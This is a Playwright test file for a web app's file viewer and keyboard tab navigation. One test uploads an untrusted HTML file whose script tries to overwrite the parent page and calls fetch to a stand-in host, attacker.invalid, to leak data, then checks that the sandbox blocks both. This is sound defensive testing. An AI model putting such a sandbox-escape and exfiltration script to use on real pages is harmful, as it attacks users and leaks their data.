import { test, expect } from '@playwright/test';
test('untrusted HTML cannot reach the parent application or make network requests', async ({
  page,
}) => {
  await page.goto('/');
  await expect(page.getByText('Connected', { exact: true })).toBeVisible();
  const requests: string[] = [];
  page.on('request', (r) => {
    if (r.url().includes('attacker.invalid')) requests.push(r.url());
  });
  await page.getByLabel('Upload files').setInputFiles({
    name: 'untrusted.html',
    mimeType: 'text/html',
    buffer: Buffer.from(
      `<h1>Sandboxed artifact</h1><script>try{parent.document.body.innerHTML='ESCAPED'}catch(e){document.body.dataset.isolated='true'}fetch('https://attacker.invalid/leak').catch(()=>document.body.dataset.blocked='true')</script>`,
    ),
  });
  await page.getByRole('tab', { name: 'Files' }).click();
  await page
    .getByRole('tabpanel', { name: 'files panel' })
    .getByRole('button', { name: /untrusted.html/ })
    .click();
  const frame = page.frameLocator('iframe[title="untrusted.html"]');
  await expect(frame.getByRole('heading', { name: 'Sandboxed artifact' })).toBeVisible();
  await expect(frame.locator('body')).toHaveAttribute('data-isolated', 'true');
  await expect(frame.locator('body')).toHaveAttribute('data-blocked', 'true');
  await expect(page.getByLabel('Research question', { exact: true })).toBeVisible();
  expect(requests).toEqual([]);
});
test('tab navigation and reduced-motion layout remain keyboard usable', async ({ page }) => {
  await page.emulateMedia({ reducedMotion: 'reduce' });
  await page.goto('/');
  await expect(page.getByText('Connected', { exact: true })).toBeVisible();
  await page.getByRole('tab', { name: 'Canvas', exact: true }).focus();
  await page.keyboard.press('ArrowRight');
  await expect(page.getByRole('tab', { name: 'Lab', exact: true })).toBeFocused();
  await expect(page.getByLabel('Experiment code')).toBeVisible();
  await page.keyboard.press('End');
  await expect(page.getByRole('tab', { name: 'Files', exact: true })).toBeFocused();
});
